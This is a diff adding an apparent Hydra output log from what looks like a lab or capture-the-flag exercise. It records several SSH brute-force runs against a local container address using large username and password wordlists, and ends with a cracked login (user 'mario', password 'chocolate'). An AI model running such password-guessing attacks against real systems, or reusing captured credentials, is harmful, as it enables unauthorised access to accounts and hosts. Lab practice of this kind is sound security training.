@@ -1,0 +1,6 @@
+# Hydra v9.7 run at 2026-06-11 18:04:26 on 172.17.0.2 ssh (hydra -L /home/Zer0th/Desktop/Lists/SecLists/Usernames/xato-net-10-million-usernames.txt -P /home/Zer0th/Desktop/Lists/Rockyou/rockyou.txt -t 4 -v -o Trust.txt ssh://172.17.0.2)
+# Hydra v9.7 run at 2026-06-11 18:05:53 on 172.17.0.2 ssh (hydra -L /home/Zer0th/Desktop/Lists/SecLists/Usernames/xato-net-10-million-usernames.txt -P /home/Zer0th/Desktop/Lists/Rockyou/rockyou.txt -t 4 -v -o Trust.txt ssh://172.17.0.2)
+# Hydra v9.7 run at 2026-06-11 18:09:31 on 172.17.0.2 ssh (hydra -L /home/Zer0th/Desktop/Lists/SecLists/Usernames/xato-net-10-million-usernames.txt -P /home/Zer0th/Desktop/Lists/Rockyou/rockyou.txt -t 4 -V -o Trust.txt ssh://172.17.0.2)
+# Hydra v9.7 run at 2026-06-11 18:14:35 on 172.17.0.2 ssh (hydra -l Mario -P /home/Zer0th/Desktop/Lists/Rockyou/rockyou.txt -t 4 -V -o Trust.txt ssh://172.17.0.2)
+# Hydra v9.7 run at 2026-06-11 18:19:17 on 172.17.0.2 ssh (hydra -l mario -P /home/Zer0th/Desktop/Lists/Rockyou/rockyou.txt -t 4 -V -o Trust.txt ssh://172.17.0.2)
+[22][ssh] host: 172.17.0.2   login: mario   password: chocolate
